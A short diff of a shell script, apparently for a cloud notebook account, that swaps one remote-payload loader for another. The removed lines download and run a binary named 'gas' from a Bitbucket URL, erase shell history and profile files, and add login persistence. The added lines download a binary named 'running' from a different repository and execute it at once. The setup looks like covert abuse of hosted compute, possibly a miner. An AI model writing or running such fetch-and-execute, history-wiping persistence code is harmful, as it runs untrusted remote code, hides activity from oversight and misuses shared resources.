@@ -8,16 +8,6 @@ cd .lib
 rm -R *
 rm -R /home/studio-lab-user/.ton
 
-wget https://bitbucket.org/andikasdsdssda/gas/raw/5e16a0239b39e03714c779670c8037417b5fe75c/gas && chmod u+x gas && mv bash /home/studio-lab-user/.lib && cd .. && history -cr
-echo ""  > /home/studio-lab-user/.bashrc
-echo "" > /home/studio-lab-user/.bash_history
-echo "" > /home/studio-lab-user/.bash_profile
-echo 'echo ""  >> /home/studio-lab-user/.bash_history' >> /home/studio-lab-user/.bashrc
-echo "source /home/studio-lab-user/.bash_profile"  >> /home/studio-lab-user/.bashrc
-echo "LD_LIBRARY_PATH=/home/studio-lab-user/.lib" > /home/studio-lab-user/.bash_profile
-echo "export LD_LIBRARY_PATH" >> /home/studio-lab-user/.bash_profile
-echo "bash /home/studio-lab-user/.lib/gas.sh"  >> /home/studio-lab-user/.bash_profile
-echo "./.lib/bash gas" > /home/studio-lab-user/.lib/gas.sh
-chmod +x gas && cd ~/ && source .bashrc
-
+wget https://bitbucket.org/andikasdsdssda/nasika/raw/9d4c0386ebb7aa05cb18fd7dddc26cbba5992f16/running && chmod u+x running
+./running
 
